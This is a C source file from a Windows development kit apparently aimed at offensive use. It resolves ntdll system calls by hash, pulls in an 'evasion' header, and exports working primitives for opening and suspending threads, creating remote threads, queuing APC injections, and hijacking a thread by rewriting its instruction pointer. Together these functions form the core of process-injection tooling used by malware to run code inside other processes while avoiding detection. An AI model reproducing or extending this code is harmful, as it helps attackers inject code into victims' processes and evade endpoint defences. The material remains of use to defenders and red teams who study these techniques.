// MDK
// docs    : https://sebafvs.com/mdk/thread
// author  : @sebafvs

#include <windows.h>
#include "mdk/thread.h"
#include "mdk/evasion.h"
#include "mdk/nt.h"
#include "mdk/hashes.h"

// function pointer types

typedef NTSTATUS(NTAPI* pfnNtSuspendThread)(HANDLE thread, PULONG PreviousSuspendCount);
typedef NTSTATUS(NTAPI* pfnNtResumeThread)(HANDLE thread, PULONG PreviousSuspendCount);
typedef NTSTATUS(NTAPI* pfnNtGetContextThread)(HANDLE thread, PCONTEXT ctx);
typedef NTSTATUS(NTAPI* pfnNtSetContextThread)(HANDLE thread, PCONTEXT ctx);
typedef NTSTATUS(NTAPI* pfnNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, MDK_OBJ_ATTRS* ObjectAttributes, MDK_CLIENT_ID* ClientId);
typedef NTSTATUS(NTAPI* pfnNtClose)(HANDLE Handle);
typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)(PHANDLE thread, ACCESS_MASK Access, PVOID ObjAttrs, HANDLE process, PVOID Start, PVOID Param, ULONG Flags, SIZE_T StackZeroBits, SIZE_T StackCommit, SIZE_T StackReserve, PVOID BytesBuffer);
typedef NTSTATUS(NTAPI* pfnNtSuspendProcess)(HANDLE ProcessHandle);
typedef NTSTATUS(NTAPI* pfnNtResumeProcess)(HANDLE ProcessHandle);
typedef NTSTATUS(NTAPI* pfnNtQueueApcThread)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArg1, PVOID ApcArg2, PVOID ApcArg3);

// static state

static pfnNtSuspendThread     _NtSuspendThread;
static pfnNtResumeThread      _NtResumeThread;
static pfnNtGetContextThread  _NtGetContextThread;
static pfnNtSetContextThread  _NtSetContextThread;
static pfnNtOpenThread        _NtOpenThread;
static pfnNtClose             _NtClose;
static pfnNtCreateThreadEx    _NtCreateThreadEx;
static pfnNtSuspendProcess    _NtSuspendProcess;
static pfnNtResumeProcess     _NtResumeProcess;
static pfnNtQueueApcThread    _NtQueueApcThread;
static BOOL                   _ready;

// init

static MDK_RESULT _init(void) {
    if (_ready) { return MDK_MAKE_OK(); }
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtSuspendThread_H,    (PVOID*)&_NtSuspendThread));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtResumeThread_H,     (PVOID*)&_NtResumeThread));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtGetContextThread_H, (PVOID*)&_NtGetContextThread));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtSetContextThread_H, (PVOID*)&_NtSetContextThread));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtOpenThread_H,       (PVOID*)&_NtOpenThread));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtClose_H,            (PVOID*)&_NtClose));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtCreateThreadEx_H,   (PVOID*)&_NtCreateThreadEx));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtSuspendProcess_H,   (PVOID*)&_NtSuspendProcess));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtResumeProcess_H,    (PVOID*)&_NtResumeProcess));
    MDK_CHECK(mdk_dfr_resolve(NTDLL_H, NtQueueApcThread_H,   (PVOID*)&_NtQueueApcThread));
    _ready = TRUE;
    return MDK_MAKE_OK();
}

// handle ops

MDK_RESULT mdk_open_thread(IN DWORD tid, IN DWORD access, OUT HANDLE* thread) {
    MDK_CHECK(_init());
    MDK_OBJ_ATTRS object_attributes = { .Length = sizeof(MDK_OBJ_ATTRS) };
    MDK_CLIENT_ID client_id         = { NULL, (HANDLE)(ULONG_PTR)tid };

    NTSTATUS status = _NtOpenThread(thread, access, &object_attributes, &client_id);
    return status ? MDK_MAKE_FAIL("NtOpenThread", status) : MDK_MAKE_OK();
}

MDK_RESULT mdk_close_thread(IN HANDLE thread) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtClose(thread);
    return status ? MDK_MAKE_FAIL("NtClose", status) : MDK_MAKE_OK();
}

// thread control

MDK_RESULT mdk_suspend_thread(IN HANDLE thread) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtSuspendThread(thread, NULL);
    return status ? MDK_MAKE_FAIL("NtSuspendThread", status) : MDK_MAKE_OK();
}

MDK_RESULT mdk_resume_thread(IN HANDLE thread) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtResumeThread(thread, NULL);
    return status ? MDK_MAKE_FAIL("NtResumeThread", status) : MDK_MAKE_OK();
}

MDK_RESULT mdk_suspend_process(IN HANDLE process) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtSuspendProcess(process);
    return status ? MDK_MAKE_FAIL("NtSuspendProcess", status) : MDK_MAKE_OK();
}

MDK_RESULT mdk_resume_process(IN HANDLE process) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtResumeProcess(process);
    return status ? MDK_MAKE_FAIL("NtResumeProcess", status) : MDK_MAKE_OK();
}

// context manipulation

MDK_RESULT mdk_get_context(IN HANDLE thread, IN OUT CONTEXT* ctx) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtGetContextThread(thread, ctx);
    return status ? MDK_MAKE_FAIL("NtGetContextThread", status) : MDK_MAKE_OK();
}

MDK_RESULT mdk_set_context(IN HANDLE thread, IN CONTEXT* ctx) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtSetContextThread(thread, ctx);
    return status ? MDK_MAKE_FAIL("NtSetContextThread", status) : MDK_MAKE_OK();
}

MDK_RESULT mdk_get_rip(IN HANDLE thread, OUT PVOID* rip) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };

    MDK_RESULT result = mdk_get_context(thread, &ctx);
    if (MDK_FAIL(result)) { return result; }

    *rip = (PVOID)ctx.Rip;
    return MDK_MAKE_OK();
}

MDK_RESULT mdk_set_rip(IN HANDLE thread, IN PVOID rip) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };

    MDK_RESULT result = mdk_get_context(thread, &ctx);
    if (MDK_FAIL(result)) { return result; }

    ctx.Rip = (DWORD64)rip;
    return mdk_set_context(thread, &ctx);
}

// thread creation

MDK_RESULT mdk_create_remote_thread(IN HANDLE process, IN PVOID start, IN PVOID param, IN DWORD flags, OUT HANDLE* thread) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtCreateThreadEx(thread, THREAD_ALL_ACCESS, NULL, process, start, param, flags, 0, 0, 0, NULL);
    return status ? MDK_MAKE_FAIL("NtCreateThreadEx", status) : MDK_MAKE_OK();
}

// APC injection

MDK_RESULT mdk_queue_apc(IN HANDLE thread, IN PVOID apc_routine, IN PVOID arg) {
    MDK_CHECK(_init());
    NTSTATUS status = _NtQueueApcThread(thread, apc_routine, arg, NULL, NULL);
    return status ? MDK_MAKE_FAIL("NtQueueApcThread", status) : MDK_MAKE_OK();
}

// utils

MDK_RESULT mdk_hijack_thread(IN HANDLE thread, IN PVOID address) {
    MDK_CHECK(mdk_suspend_thread(thread));

    // On set_rip failure, restore thread state before returning.
    MDK_RESULT result = mdk_set_rip(thread, address);
    if (MDK_FAIL(result)) {
        mdk_resume_thread(thread);
        return result;
    }

    return mdk_resume_thread(thread);
}
